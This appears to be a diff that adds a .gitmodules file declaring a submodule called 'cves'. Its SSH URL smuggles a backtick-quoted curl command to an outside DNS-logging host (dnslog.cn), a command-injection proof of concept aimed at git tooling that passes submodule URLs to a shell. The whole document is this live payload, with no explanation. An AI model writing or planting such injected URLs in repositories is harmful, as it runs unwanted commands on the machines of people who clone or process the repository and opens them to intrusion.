@@ -1,0 +1,3 @@
+[submodule "cves"]
+  path = cves
+  url = ssh://'`curl http://5aurhp.dnslog.cn`'foo.example.com/bar
